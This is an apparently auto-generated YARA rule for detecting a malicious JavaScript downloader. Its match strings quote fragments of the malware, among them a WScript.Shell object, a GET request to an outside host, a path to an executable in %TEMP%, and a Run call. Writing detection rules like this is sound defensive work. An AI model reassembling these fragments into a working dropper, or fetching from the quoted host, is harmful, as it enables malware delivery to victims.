rule sig_20160328_74569951441e1881327c37e98c3684f9 {
  meta:
    description = "datamaliciousorder - file 20160328_74569951441e1881327c37e98c3684f9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e6dab00d4f48cd1310d7b32a7171c23d6600e4ede74dd1ecc6f474705f5aa185"

  strings:
    $s1  = "function Jrxjqy() {return Tbwitj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"SgFmPKVW.exe\";};" fullword ascii
    $s2  = "Scyepgo[Liyeph](\"GET\", \"http://santhiyasreetrading.com/j5ysdla\", false);" fullword ascii
    $s3  = "do {WScript[Qajvlxx](Fxmsqofbvt() * 11)} while (Scyepgo[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Cuxrs(Bmipx, Loludjqyap){return Bmipx - Loludjqyap;};" fullword ascii
    $s5  = "var Tbwitj = function Nnkrl() {return WScript[Azaihaypxg](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Uzblx(Ywbabv){Tbwitj[\"Run\"](Ywbabv, Apibjkg, Apibjkg);};" fullword ascii
    $s7  = "function Qxwnlinzwb() {return ((Ssrefmtojk == true) && (Ssrefmtojk == Ozbzomwz)) ? 1 : Apibjkg;};" fullword ascii
    $s8  = "function Cidcekr(){return Azaihaypxg;};" fullword ascii
    $s9  = " while (Kwuman){" fullword ascii
    $s10 = "Ssrefmtojk = true; " fullword ascii
    $s11 = "var Ozbzomwz = false;" fullword ascii
    $s12 = "var Zlszfizuav = false;" fullword ascii
    $s13 = "function Fxmsqofbvt(){return 22;};" fullword ascii
    $s14 = "var Ssrefmtojk = false;" fullword ascii
    $s15 = "function Lanbmq()" fullword ascii
    $s16 = "function Eyymjjwhyl(Qnpxxpav) {var Sematn = (1, 2, 3, 4, 5, Qnpxxpav); return Sematn;};" fullword ascii
    $s17 = "return Cuxrs(Sntytan, Abhofy);" fullword ascii
    $s18 = "Ozbzomwz = true; " fullword ascii
    $s19 = "function Etnerdhm(){return Lvjesvsg;};" fullword ascii
    $s20 = "var Szgxgmds = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}